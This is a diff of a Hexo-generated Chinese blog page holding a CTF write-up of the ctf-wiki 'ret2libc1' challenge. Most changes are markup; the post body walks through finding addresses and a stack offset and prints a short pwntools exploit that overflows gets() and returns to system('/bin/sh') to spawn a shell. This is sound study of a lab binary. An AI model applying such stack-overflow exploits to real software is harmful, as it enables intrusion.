@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -152,7 +154,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-ret2libc1"><span class="nav-text">T3 ret2libc1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-ctf-wiki%E4%B8%AD%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%A3%E9%87%8A"><span class="nav-text">0x00  ctf-wiki中的原理解释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-questions"><span class="nav-text">0x05 questions</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T3 ret2libc1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x00  ctf-wiki中的原理解释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x05 questions</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -178,7 +180,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -370,18 +372,18 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
+        <h2><span id="t3-ret2libc1">T3 ret2libc1</span></h2><blockquote>
 <p>2023-01-09WP<br>ctf-wiki 基础rop</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x00-ctf-wiki中的原理解释"><a href="#0x00-ctf-wiki中的原理解释" class="headerlink" title="0x00  ctf-wiki中的原理解释"></a>0x00  ctf-wiki中的原理解释</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
+<h3><span id="0x00-ctf-wiki中的原理解释">0x00  ctf-wiki中的原理解释</span></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
+<h3><span id="0x02">0x02</span></h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
+<h3><span id="0x03">0x03</span></h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
+<h3><span id="0x04">0x04</span></h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了<br><del>我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起</del></p>
-<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>也可以直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处，<br>但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数<br>一个plt表和got表的<a target="_blank" rel="noopener" href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">教学文章</a></p>
+<h3><span id="0x05-questions">0x05 questions</span></h3><p>也可以直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处，<br>但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数<br>一个plt表和got表的<a target="_blank" rel="noopener" href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">教学文章</a></p>
 
     </div>
 
@@ -589,13 +591,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
